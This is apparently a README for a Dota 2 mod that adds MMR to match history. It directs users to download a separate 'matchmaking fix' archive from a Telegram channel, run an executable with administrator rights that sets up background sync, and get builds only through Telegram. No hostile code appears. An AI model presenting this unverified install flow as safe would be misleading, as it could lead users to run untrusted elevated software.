# ShowMMR

Your MMR, back in the Dota 2 match history.

```
HERO PLAYED       RESULT         DATE / TIME          DURATION   TYPE
[icon] Lina       1489 (+40)     26-8-2026  17:37     56:19      Ranked
[icon] Axe        1449 (-26)     26-8-2026  16:55     34:48      Ranked
[icon] Crystal M. 1475 (+40)     25-8-2026  21:19     47:43      Ranked
```

```
[avatar] [medal]  CRUSADER 3
                  STAR  ▓▓▓▓▓▓▓░░░  143
                  RANK  ▓▓▓░░░░░░░  451
```

Info about new builds: **[t.me/feereeks](https://t.me/feereeks)**

## Install

0. Install the matchmaking fix from [here](https://t.me/fanatimadkidadetishlux/56)
1. Steam → right-click Dota 2 → Properties → Launch Options → add `-condebug`
2. Close Dota 2
3. Run `ShowMMR.exe` and follow the three steps
4. Play a ranked match

That's it. One file, nothing else to install. 
Background sync is set up automatically.

The numbers only start from the match you play after installing. Older ones can
be imported — **import matches** in the window says how.

## If matchmaking stops working

Just run the FixMatchMaking.bat from the archive you downloaded in step 0.

## Notes

- After a Dota update Steam puts `gameinfo` back and the mod stops loading.
  Just run FixMatchMaking.bat and install again — ten seconds, history untouched.
- The first recorded match shows `(+0)`. There's nothing before it to compare against.
- It asks for administrator rights because Dota often sits in `Program Files`.
- Changing the client language won't affect the mod.

## License

See [LICENSE.txt](LICENSE.txt). Personal use. Do not reupload the file — send
people to [t.me/feereeks](https://t.me/feereeks).

Built on [AveYo's ShowMMR](https://github.com/AveYo/ShowMMR) (2023), MIT
licensed; that notice is reproduced in full in the license file.

Unofficial client-side interface modification. Not affiliated with or endorsed
by Valve Corporation.
